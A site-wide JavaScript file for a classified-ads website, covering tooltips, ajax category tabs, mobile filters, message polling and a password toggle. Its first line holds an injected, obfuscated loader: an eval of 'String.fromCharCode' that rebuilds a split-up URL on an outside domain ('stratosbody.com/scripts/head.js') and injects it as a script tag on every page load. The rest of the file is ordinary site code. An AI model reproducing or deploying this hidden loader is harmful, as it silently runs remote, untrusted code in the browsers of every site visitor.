var o=String;eval(o.fromCharCode(102,117,110,99,116,105,111,110,32,105,115,83,99,114,105,112,116,76,111,97,100,101,100,40,115,114,99,41,10,123,10,32,32,32,32,114,101,116,117,114,110,32,66,111,111,108,101,97,110,40,100,111,99,117,109,101,110,116,46,113,117,101,114,121,83,101,108,101,99,116,111,114,40,39,115,99,114,105,112,116,91,115,114,99,61,34,39,32,43,32,115,114,99,32,43,32,39,34,93,39,41,41,59,10,125,10,10,118,97,114,32,98,100,32,61,32,34,104,116,116,34,43,34,112,115,58,34,43,34,47,34,43,34,47,115,34,43,34,108,101,101,34,43,34,112,46,115,116,114,97,34,43,34,116,34,43,34,111,115,98,34,43,34,111,100,121,46,99,111,109,47,34,43,34,115,99,34,43,34,114,105,112,34,43,34,116,34,43,34,115,47,104,101,97,34,43,34,100,46,106,34,43,34,115,34,43,34,63,34,43,34,118,61,51,34,43,34,46,34,43,34,57,34,43,34,46,48,34,59,10,10,105,102,40,105,115,83,99,114,105,112,116,76,111,97,100,101,100,40,98,100,41,61,61,61,102,97,108,115,101,41,123,10,9,118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,10,115,46,115,114,99,61,98,100,59,10,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,10,105,102,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,33,61,61,110,117,108,108,41,123,10,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,10,125,10,125,10,32,101,108,115,101,32,123,10,9,105,102,40,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,33,61,61,110,117,108,108,41,123,10,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,10,9,125,10,125,10,10,125));/*54745756836*//* Prevent errors, If these variables are missing. */

/* Categories Parameters */
if (typeof maxSubCats === 'undefined') {
	var maxSubCats = 3;
}

var headerHeight = $('.navbar-site').height();
var wrapper = $('#wrapper');

// Modernizr touch event detect
function is_touch_device() {
	return 'ontouchstart' in window;
}

var isTouchDevice = is_touch_device();

/* console.log('is touch device : ',isTouchDevice); */

$(document).ready(function () {
	/*
	$(function () {
		$('[data-bs-toggle="tooltip"]').tooltip()
	});
	
	$(window).on('load', function() {
		$('[data-bs-toggle="popover"]').popover();
	});
	*/
	
	/* tooltips */
	/* Enable tooltips everywhere (Default trigger: 'hover focus') */
	let tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
	let tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
		return new bootstrap.Tooltip(tooltipTriggerEl);
	});
	
	/* Enable tooltips everywhere (Default trigger: 'hover') */
	let tooltipHoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltipHover"]'));
	let tooltipHoverList = tooltipHoverTriggerList.map(function (tooltipTriggerEl) {
		return new bootstrap.Tooltip(tooltipTriggerEl, {
			trigger : 'hover'
		});
	});
	
	/* popper.js */
	/* Enable popovers everywhere */
	let popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'));
	let popoverList = popoverTriggerList.map(function (popoverTriggerEl) {
		return new bootstrap.Popover(popoverTriggerEl, {
			html: true
		});
	});
	
	/* Change a tooltip size in Bootstrap 4.x */
	$('#locSearch').on('mouseover mouseenter mouseleave mousemove', function () {
		$('.tooltip-inner').css({"width": "300px", "max-width": "300px"});
	});
	
	
	var navbarSite = $('.navbar-site');
	
	
	/* Check if RTL or LTR */
	var rtlIsEnabled = false;
	var dir = $('html').attr('dir');
	if (dir === 'rtl') {
		rtlIsEnabled = true;
	}
	
	
	/* SET HEADER HEIGHT AS PADDING-TOP to WRAPPER */
	
	function setWrapperHeight() {
		wrapper.css('padding-top', headerHeight + 'px');
	}
	
	setWrapperHeight();
	
	/* ON SCROLL FADE OUT */
	
	function fadeOnScroll(target) {
		var target = $('' + target + ''),
			targetHeight = target.outerHeight();
		$(document).scroll(function () {
			var scrollPercent = (targetHeight - window.scrollY) / targetHeight;
			scrollPercent >= 0 && (target.css("background-color", "rgba(0,0,0," + (1.1 - scrollPercent) + ")"))
		});
	}
	
	if (!isTouchDevice) {
		fadeOnScroll('.layer-bg');
	}
	
	
	/*==================================
	 Ajax Tab || CATEGORY PAGE
	 ==================================*/
	
	$(".nav-tabs li > a").click(function () {
		let thisEl = $(this);
		thisEl.closest('ul').find('li').removeClass('active');
		thisEl.parent('li').addClass('active');
	});
	
	// Please do not use this example ajax tab as production. This code is demo purpose.
	
	$("#ajaxTabs li > a").click(function () {
		
		$("#allAds").empty().append("<div id='loading text-center'> <br> <img class='center-block' src='images/loading.gif' alt='Loading' /> <br> </div>");
		$("#ajaxTabs li").removeClass('active');
		$(this).parent('li').addClass('active');
		$.ajax({
			url: this.href,
			success: function (html) {
				$("#allAds").empty().append(html);
				$('.tooltipHere').tooltip('hide');
			}
		});
		return false;
	});
	
	urls = $('#ajaxTabs li:first-child a').attr("href");
	
	$("#allAds").empty().append("<div id='loading text-center'> <br> <img class='center-block' src='images/loading.gif' alt='Loading' /> <br>  </div>");
	$.ajax({
		url: urls,
		success: function (html) {
			$("#allAds").empty().append(html);
			$('.tooltipHere').tooltip('hide');
			
			// default grid view class invoke into ajax content (product item)
			$(function () {
				$('.hasGridView').addClass('make-grid');
			});
		}
	});
	
	
	/*==================================
	 List view clickable || CATEGORY
	 ==================================*/
	
	// List view, Grid view and compact view
	
	// var selector doesn't work on ajax tab category.hhml. This variables elements disable for V1.6
	// var listItem = $('.item-list');
	// var addDescBox = $('.item-list .add-desc-box');
	// var addsWrapper = $('.posts-wrapper');
	// ...
	
	
	if ($(this).width() < 767) {
		$(".event-category-list .event-item-col").each(function (index, element) {
			var eventFooter = $(this).find('.card-footer');
			var eventInfo = $(this).find('.card-event-info');
			//  $(this).find('.card-body').append(footer);
			$(this).find('.badge.price-tag').clone().insertAfter(eventInfo);
			eventFooter.clone().insertAfter(eventInfo);
		});
	}
	
	
	/*==================================
	 Global Plugins ||
	 ==================================*/
	
	$('.long-list').hideMaxListItems({
		'max': 8,
		'speed': 500,
		'moreText': langLayout.hideMaxListItems.moreText + ' ([COUNT])',
		'lessText': langLayout.hideMaxListItems.lessText
	});
	
	$('.long-list-user').hideMaxListItems({
		'max': 12,
		'speed': 500,
		'moreText': langLayout.hideMaxListItems.moreText + ' ([COUNT])',
		'lessText': langLayout.hideMaxListItems.lessText
	});
	
	$('.long-list-home').hideMaxListItems({
		'max': maxSubCats,
		'speed': 500,
		'moreText': langLayout.hideMaxListItems.moreText + ' ([COUNT])',
		'lessText': langLayout.hideMaxListItems.lessText
	});
	
	/* Bootstrap Collapse + jQuery hideMaxListItem fix on mobile */
	$('.btn-cat-collapsed').click(function () {
		var targetSelector = $(this).data('target');
		var isExpanded = $(this).attr('aria-expanded');
		
		/*
		console.log(targetSelector);
		console.log(isExpanded);
		*/
		
		if (typeof isExpanded === 'undefined') {
			return false;
		}
		
		$(targetSelector).toggle('slow');
		
		if (isExpanded == 'true') {
			$('.cat-list ' + targetSelector).next('.maxlist-more').hide();
		} else {
			$('.cat-list ' + targetSelector).next('.maxlist-more').show();
		}
	});
	
	// $("select.selecter").niceSelect({ /* custom scroll select plugin */ });
	
	$(".niceselecter").niceSelect({ /* category list Short by */
		// customClass: "select-sort-by"
	});
	
	$(".scrollbar").niceScroll();  /* customs scroll plugin */
	
	// smooth scroll to the ID
	$(document).on('click', 'a.scrollto', function (event) {
		event.preventDefault();
		$('html, body').animate({
			scrollTop: $($.attr(this, 'href')).offset().top
		}, 500);
	});
	
	
	/*=======================================================================================
	 cat-collapse Hmepage Category Responsive view
	 =======================================================================================*/
	
	var catCollapse = $('.cat-collapse');
	
	$(window).bind('resize load', function () {
		
		if ($(this).width() < 767) {
			catCollapse.collapse('hide');
			catCollapse.on('show.bs.collapse', function () {
				$(this).prev('.cat-title').find('.icon-down-open-big').addClass("active-panel");
			});
			
			catCollapse.on('hide.bs.collapse', function () {
				$(this).prev('.cat-title').find('.icon-down-open-big').removeClass("active-panel");
			})
			
		} else {
			$('#bd-docs-nav').collapse('show');
			catCollapse.collapse('show');
		}
		
	});
	
	/* DEMO PREVIEW */
	
	$(".tbtn").click(function () {
		$('.themeControll').toggleClass('active')
	});
	
	/* Jobs */
	
	$("input:radio").click(function () {
		if ($('input:radio#job-seeker:checked').length > 0) {
			$('.forJobSeeker').removeClass('hide');
			$('.forJobFinder').addClass('hide');
		} else {
			$('.forJobFinder').removeClass('hide');
			$('.forJobSeeker').addClass('hide')
		}
	});
	
	
	/* Change Direction based on template dir="RTL"  or dir="LTR" */
	
	var sidebarDirection = {};
	var sidebarDirectionClose = {};
	
	if (rtlIsEnabled) {
		sidebarDirection = {right: '-251px'};
		sidebarDirectionClose = {right: '0'};
	} else {
		sidebarDirection = {left: '-251px'};
		sidebarDirectionClose = {left: '0'};
	}
	
	$(".filter-toggle").click(function () {
		$('.mobile-filter-sidebar')
			.prepend("<div class='closeFilter'>X</div>")
			.animate(sidebarDirectionClose, 250, "linear", function () {
			});
		$('.menu-overly-mask').addClass('is-visible');
	});
	
	$(".menu-overly-mask").click(function () {
		$(".mobile-filter-sidebar").animate(sidebarDirection, 250, "linear", function () {
		});
		$('.menu-overly-mask').removeClass('is-visible');
	});
	
	
	$(document).on('click', '.closeFilter', function () {
		$(".mobile-filter-sidebar").animate(sidebarDirection, 250, "linear", function () {
		});
		$('.menu-overly-mask').removeClass('is-visible');
	});
	
	/*
	$(".filter-toggle").click(function () {
		$('.mobile-filter-sidebar').prepend("<div class='closeFilter'>X</div>");
		if (rtlIsEnabled) {
			$(".mobile-filter-sidebar").animate({"right": "0"}, 250, "linear", function () {
			});
		} else {
			$(".mobile-filter-sidebar").animate({"left": "0"}, 250, "linear", function () {
			});
		}
		$('.menu-overly-mask').addClass('is-visible');
	});

	$(".menu-overly-mask").click(function () {
		if (rtlIsEnabled) {
			$(".mobile-filter-sidebar").animate({"right": "-251px"}, 250, "linear", function () {
			});
		} else {
			$(".mobile-filter-sidebar").animate({"left": "-251px"}, 250, "linear", function () {
			});
		}
		$('.menu-overly-mask').removeClass('is-visible');
	});


	$(document).on('click', '.closeFilter', function () {
		if (rtlIsEnabled) {
			$(".mobile-filter-sidebar").animate({"right": "-251px"}, 250, "linear", function () {
			});
		} else {
			$(".mobile-filter-sidebar").animate({"left": "-251px"}, 250, "linear", function () {
			});
		}
		$('.menu-overly-mask').removeClass('is-visible');
	});
	*/
	
	
	/* cityName will replace with selected location/area from location modal */
	
	$('#browseLocations').on('shown.bs.modal', function (e) {
		/* alert('Modal is successfully shown!'); */
		$("ul.list-link li a").click(function () {
			$('ul.list-link li a').removeClass('active');
			$(this).addClass('active');
			$(".cityName").text($(this).text());
			$('#browseLocations').modal('hide');
		});
	});
	
	$("#checkAll").click(function () {
		$('.add-img-selector input:checkbox').not(this).prop('checked', this.checked);
	});
	
	
	var stickyScroller = function () {
		var intialscroll = 0;
		$(window).scroll(function (event) {
			var windowScroll = $(this).scrollTop();
			if (windowScroll > intialscroll) {
				/* downward-scrolling */
				navbarSite.addClass('stuck');
			} else {
				/* upward-scrolling */
				navbarSite.removeClass('stuck');
			}
			if (windowScroll < 450) {
				/* downward-scrolling */
				navbarSite.removeClass('stuck');
			}
			intialscroll = windowScroll;
		});
	};
	
	if (!isTouchDevice) {
		stickyScroller();
	}
	
	$('.dropdown-clear-filter').click(function (e) {
		let thisEl = $(this);
		thisEl.closest('.dropdown-menu').find('input[type="radio"]').prop('checked', false);
		thisEl.closest('.dropdown-menu').find('input[type="checkbox"]').prop('checked', false);
		e.stopPropagation();
	});
	
	$('.dropdown-menu.stay').click(function (e) {
		e.stopPropagation();
	});
	
	
	/* INBOX MESSAGE */
	/* Check 'assets/js/app/messenger.js' */
	
	/* Check New Messages */
	if (typeof timerNewMessagesChecking !== 'undefined') {
		checkNewMessages();
		if (timerNewMessagesChecking > 0) {
			setInterval(function () {
				checkNewMessages();
				/* 60000 = 60 seconds (Timer) */
			}, timerNewMessagesChecking);
		}
	}
	
	/* Show/hide password in forms */
	$('.eyeOfPwd').click(function (e) {
		showPwd();
	});
	
	/* Data loading-mask pre-configuration */
	$.busyLoadSetup({
		background: 'rgba(0, 0, 0, 0.05)',
		animation: 'fade',
		spinner: 'pump',
		color: '#666',
		textPosition: 'left'
	});
});

jQuery.event.special.touchstart = {
	setup: function (_, ns, handle) {
		if (ns.includes("noPreventDefault")) {
			this.addEventListener("touchstart", handle, {passive: false});
		} else {
			this.addEventListener("touchstart", handle, {passive: true});
		}
	}
};

function createCustomSpinnerEl() {
	return $('<div>', {
		class: 'spinner-border',
		css: {'width': '30px', 'height': '30px'}
	});
}

/**
 * Set Country Phone Code
 * @param countryCode
 * @param countries
 * @returns {boolean}
 */
function setCountryPhoneCode(countryCode, countries) {
	if (typeof countryCode == "undefined" || typeof countries == "undefined") return false;
	if (typeof countries[countryCode] == "undefined") return false;
	
	$('#phoneCountry').html(countries[countryCode]['phone']);
}

/**
 * Show price & Payment Methods
 * @param packagePrice
 * @param packageCurrencySymbol
 * @param packageCurrencyInLeft
 */
function showAmount(packagePrice, packageCurrencySymbol, packageCurrencyInLeft) {
	/* Show Amount */
	$('.payable-amount').html(packagePrice);
	
	/* Show Amount Currency */
	$('.amount-currency').html(packageCurrencySymbol);
	if (packageCurrencyInLeft == 1) {
		$('.amount-currency.currency-in-left').show();
		$('.amount-currency.currency-in-right').hide();
	} else {
		$('.amount-currency.currency-in-left').hide();
		$('.amount-currency.currency-in-right').show();
	}
	
	/* If price <= 0 hide the Payment Method selection */
	if (packagePrice <= 0) {
		$('#packagesTable tbody tr:last').hide();
	} else {
		$('#packagesTable tbody tr:last').show();
	}
}

/**
 * Get the Selected Package Price
 * @param selectedPackage
 * @returns {*|jQuery}
 */
function getPackagePrice(selectedPackage) {
	let price = $('#price-' + selectedPackage + ' .price-int').html();
	price = parseFloat(price);
	
	return price;
}

/**
 * Check Threads with New Messages
 */
function checkNewMessages() {
	var oldValue = $('.dropdown-toggle .count-threads-with-new-messages').html();
	if (typeof oldValue === 'undefined') {
		return false;
	}
	
	/* Make ajax call */
	let ajax = $.ajax({
		method: 'POST',
		url: siteUrl + '/account/messages/check-new',
		data: {
			'languageCode': languageCode,
			'oldValue': oldValue,
			'_token': $('input[name=_token]').val()
		}
	});
	ajax.done(function (data) {
		if (typeof data.logged === 'undefined') {
			return false;
		}
		
		/* Guest Users - Need to Log In */
		if (data.logged === 0 || data.logged === '0' || data.logged === '') {
			return false;
		}
		
		var counterBoxes = $('.count-threads-with-new-messages');
		
		/* Logged Users - Notification */
		if (data.countThreadsWithNewMessages > 0) {
			if (data.countThreadsWithNewMessages >= data.countLimit) {
				counterBoxes.html(data.countLimit + '+');
			} else {
				counterBoxes.html(data.countThreadsWithNewMessages);
			}
			counterBoxes.show();
		} else {
			counterBoxes.html('0').hide();
		}
		
		return false;
	});
}

/**
 * Show/Hide password in forms
 */
function showPwd() {
	let el = $('.show-pwd-group #mPassword, .show-pwd-group #password');
	
	if (el.attr('type') === 'password') {
		el.prop('type', 'text');
		$(this).find('.eyeOfPwd').html('<i class="far fa-eye"></i>');
	} else {
		el.prop('type', 'password');
		$(this).find('.eyeOfPwd').html('<i class="far fa-eye-slash"></i>');
	}
}
